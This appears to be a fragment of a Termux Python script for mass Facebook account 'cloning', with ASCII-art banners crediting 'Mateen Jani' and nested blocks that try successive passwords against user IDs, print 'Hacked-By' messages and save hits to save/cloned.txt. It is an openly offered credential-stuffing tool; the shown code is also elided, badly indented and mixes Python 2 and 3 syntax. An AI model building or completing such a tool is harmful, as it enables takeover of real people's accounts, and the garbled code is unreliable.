...
\033[1;92m       _             _ 
\033[1;98m      | |           (_)
\033[1;96m      | | __ _ _ __  _ 
\033[1;98m  _   | |/ _` | '_ \| |
\033[1;96m | |__| | (_| | | | | |
\033[1;92m  \____/ \__,_|_| |_|_|
...
\033[1;96m---------------------Mateen💜Jani---------------------
                

\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92m"MateenJani"                                
\033[0;91m║\033[0;91m Team :\033[0;92m "Metoo Team"                                                  
\033[0;91m║ \033[0;93mFacebook: \033[0;92m"Mateen Jani"                                                    
\033[0;95m╰════════════════════════════════════════════╯
...
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92m"Mateen Jani"                                
\033[0;91m║\033[0;91m Team :\033[0;92m "metoo Team"                                                  
\033[0;91m║ \033[0;93mFacebook: \033[0;92 "Mateem Jani"                                                    
\033[0;95m╰════════════════════════════════════════════╯
...
\033[0;92m |_|    |______|_|   
 ...
 \033[1;96m To Mateen Jani Termux Command 💜
...
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92m"Mateen Jani"                                
\033[0;91m║\033[0;91m Team :\033[0;92m "FLY"                                                  
\033[0;91m║ \033[0;93mFacebook: \033[0;92m"Mateen Jani"                                                    
\033[0;95m╰════════════════════════════════════════════╯
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-open https://m.facebook.com/RequestTimeOut408')
    else:
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print(' Hacked-By-Meroo |   User-ID    |   + password'+username)
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print(' Hacked-By-mateen  |   User-ID    |   + password'+username)
                    ...
                    if 'access_token' in q:
                        print(' Hacked-By-Mateen  |   User-ID    |   + password'+username)   
                        print '\x1b[1;93m(Jani-Hacked)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            ...
                            if 'access_token' in q:
                                ...
                                print '\x1b[1;93m(Mateen-Hacked)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    ...
                                    if 'access_token' in q:
                                        print(' Hacked-By-Jani  |   User-ID    |   + password'+username)
                                        print '\x1b[1;93m(Mateen-Hacked)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            ...
                                            if 'access_token' in q:
                                                print(' Hacked-By-Jani  |   User-ID    |   + password'+username)
                                                print '\x1b[1;93m(Jani-Hacked)  ' + k + c + user + '  |  ' + pass6
                                                okb = open('save/cloned.txt', 'a')
